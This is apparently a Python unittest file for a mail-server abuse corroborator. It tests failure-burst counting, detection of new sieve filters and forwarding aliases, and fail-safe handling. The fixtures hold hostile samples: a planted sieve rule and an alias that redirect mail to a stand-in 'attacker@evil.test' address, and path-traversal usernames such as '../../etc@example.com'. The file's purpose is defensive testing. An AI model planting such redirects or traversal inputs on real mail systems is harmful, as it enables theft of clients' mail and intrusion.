"""Tests for abuse corroboration (v1.7.12+).

The governing property: a corroboration check may never MANUFACTURE evidence.
Every failure mode — missing GRANT, unreadable directory, DB down, an
exception — has to resolve to "no signal", because a signal here promotes
enforcement up to taking a client's mailbox offline.

Stdlib unittest. Run from the repo root:

    python3 -m unittest discover -s tests -v
"""

import configparser
import os
import shutil
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.corroboration import AbuseCorroborator  # noqa: E402


class FakeMailBackend:
    def __init__(self, aliases=None, available=True):
        self.alias_check_available = available
        self._aliases = aliases
        self.calls = []

    def recent_aliases(self, email, since_ts=None):
        self.calls.append((email, since_ts))
        return self._aliases


def build(maildir_template='', mail_backend=None, **overrides):
    config = configparser.ConfigParser()
    config.add_section('compromise_detection')
    config.add_section('mail_backend')
    if maildir_template:
        config.set('mail_backend', 'maildir_template', maildir_template)
    for key, value in overrides.items():
        config.set('compromise_detection', key, str(value))
    return AbuseCorroborator(config, db=None, mail_backend=mail_backend)


class TestFailureBurst(unittest.TestCase):
    def test_burst_over_threshold_is_a_signal(self):
        c = build(corroboration_failure_threshold=20)
        for _ in range(20):
            c.record_auth_failure('office@example.com')
        signals = c.evaluate('office@example.com')
        self.assertEqual(len(signals), 1)
        self.assertIn('auth-failure burst', signals[0])

    def test_under_threshold_is_silent(self):
        c = build(corroboration_failure_threshold=20)
        for _ in range(19):
            c.record_auth_failure('office@example.com')
        self.assertEqual(c.evaluate('office@example.com'), [])

    def test_local_part_and_full_address_are_summed(self):
        # Observed on the live host: a bot tries grace@example.org then
        # grace. Counting those separately halves the burst and can drop it
        # under the threshold.
        c = build(corroboration_failure_threshold=20)
        for _ in range(10):
            c.record_auth_failure('grace@example.org')
        for _ in range(10):
            c.record_auth_failure('grace')
        signals = c.evaluate('grace@example.org')
        self.assertEqual(len(signals), 1)

    def test_case_is_normalized(self):
        c = build(corroboration_failure_threshold=5)
        for _ in range(5):
            c.record_auth_failure('Office@Example.COM')
        self.assertTrue(c.evaluate('office@example.com'))

    def test_other_accounts_do_not_contribute(self):
        c = build(corroboration_failure_threshold=5)
        for _ in range(20):
            c.record_auth_failure('someone-else@example.com')
        self.assertEqual(c.evaluate('office@example.com'), [])


class TestSieveInjection(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.root, True)
        self.template = os.path.join(self.root, '{domain}', '{user}')
        self.home = os.path.join(self.root, 'example.com', 'office')
        os.makedirs(self.home)

    def _plant(self, name='.dovecot.sieve', age_seconds=0):
        path = os.path.join(self.home, name)
        with open(path, 'w') as fh:
            fh.write('redirect "attacker@evil.test";\n')
        if age_seconds:
            old = time.time() - age_seconds
            os.utime(path, (old, old))
        return path

    def test_fresh_sieve_is_a_signal(self):
        self._plant()
        c = build(maildir_template=self.template)
        signals = c.evaluate('office@example.com')
        self.assertEqual(len(signals), 1)
        self.assertIn('sieve', signals[0])

    def test_old_sieve_is_not(self):
        # A filter the client has had for a year is routine, not evidence.
        self._plant(age_seconds=400 * 86400)
        c = build(maildir_template=self.template, corroboration_lookback_hours=168)
        self.assertEqual(c.evaluate('office@example.com'), [])

    def test_no_sieve_is_not(self):
        c = build(maildir_template=self.template)
        self.assertEqual(c.evaluate('office@example.com'), [])

    def test_missing_maildir_is_not_an_error(self):
        c = build(maildir_template=self.template)
        self.assertEqual(c.evaluate('nobody@nosuchdomain.test'), [])

    def test_unconfigured_template_skips_the_check(self):
        self._plant()
        c = build(maildir_template='')
        self.assertEqual(c.evaluate('office@example.com'), [])

    def test_path_traversal_in_username_is_refused(self):
        # Usernames arrive from log lines, so they are attacker-influenced.
        c = build(maildir_template=self.template)
        for evil in ('../../etc@example.com', 'office@../..',
                     'a/b@example.com', '.@example.com'):
            self.assertEqual(c._maildir_for(evil), '', evil)

    def test_username_without_domain_is_refused(self):
        c = build(maildir_template=self.template)
        self.assertEqual(c._maildir_for('office'), '')


class TestAliasInjection(unittest.TestCase):
    def test_dated_alias_is_a_signal(self):
        backend = FakeMailBackend(
            aliases=[{'destination': 'attacker@evil.test', 'created_at': 12345}])
        c = build(mail_backend=backend)
        signals = c.evaluate('office@example.com')
        self.assertEqual(len(signals), 1)
        self.assertIn('created in window', signals[0])
        self.assertIn('attacker@evil.test', signals[0])

    def test_undated_alias_is_reported_as_weaker(self):
        backend = FakeMailBackend(
            aliases=[{'destination': 'attacker@evil.test', 'created_at': None}])
        c = build(mail_backend=backend)
        signals = c.evaluate('office@example.com')
        self.assertIn('undated', signals[0])

    def test_no_aliases_is_not_a_signal(self):
        c = build(mail_backend=FakeMailBackend(aliases=[]))
        self.assertEqual(c.evaluate('office@example.com'), [])

    def test_unavailable_check_is_not_a_signal(self):
        # None means "could not run" — absence of evidence, not evidence of
        # absence. It must not read as either a signal OR a clean bill.
        c = build(mail_backend=FakeMailBackend(aliases=None))
        self.assertEqual(c.evaluate('office@example.com'), [])

    def test_backend_without_alias_config_is_skipped(self):
        backend = FakeMailBackend(aliases=[{'destination': 'x', 'created_at': 1}],
                                  available=False)
        c = build(mail_backend=backend)
        self.assertEqual(c.evaluate('office@example.com'), [])
        self.assertEqual(backend.calls, [])

    def test_lookback_is_passed_to_the_backend(self):
        backend = FakeMailBackend(aliases=[])
        c = build(mail_backend=backend, corroboration_lookback_hours=168)
        c.evaluate('office@example.com')
        _, since = backend.calls[0]
        self.assertAlmostEqual(since, time.time() - 168 * 3600, delta=10)


class TestFailSafety(unittest.TestCase):
    def test_a_raising_check_does_not_produce_a_signal(self):
        class Exploding:
            alias_check_available = True

            def recent_aliases(self, email, since_ts=None):
                raise RuntimeError("database on fire")

        c = build(mail_backend=Exploding())
        self.assertEqual(c.evaluate('office@example.com'), [])

    def test_a_raising_check_does_not_suppress_the_others(self):
        class Exploding:
            alias_check_available = True

            def recent_aliases(self, email, since_ts=None):
                raise RuntimeError("database on fire")

        c = build(mail_backend=Exploding(), corroboration_failure_threshold=3)
        for _ in range(3):
            c.record_auth_failure('office@example.com')
        signals = c.evaluate('office@example.com')
        self.assertEqual(len(signals), 1)
        self.assertIn('auth-failure burst', signals[0])

    def test_disabled_corroborator_returns_nothing(self):
        c = build(corroboration_enabled='false', corroboration_failure_threshold=1)
        c.record_auth_failure('office@example.com')
        self.assertEqual(c.evaluate('office@example.com'), [])

    def test_empty_username_is_safe(self):
        c = build()
        self.assertEqual(c.evaluate(''), [])
        self.assertEqual(c.evaluate(None), [])


class TestMultipleSignals(unittest.TestCase):
    def test_signals_accumulate(self):
        root = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, root, True)
        home = os.path.join(root, 'example.com', 'office')
        os.makedirs(home)
        with open(os.path.join(home, '.dovecot.sieve'), 'w') as fh:
            fh.write('redirect "attacker@evil.test";\n')

        backend = FakeMailBackend(
            aliases=[{'destination': 'attacker@evil.test', 'created_at': 12345}])
        c = build(maildir_template=os.path.join(root, '{domain}', '{user}'),
                  mail_backend=backend, corroboration_failure_threshold=3)
        for _ in range(3):
            c.record_auth_failure('office@example.com')

        signals = c.evaluate('office@example.com')
        self.assertEqual(len(signals), 3)


if __name__ == '__main__':
    unittest.main()
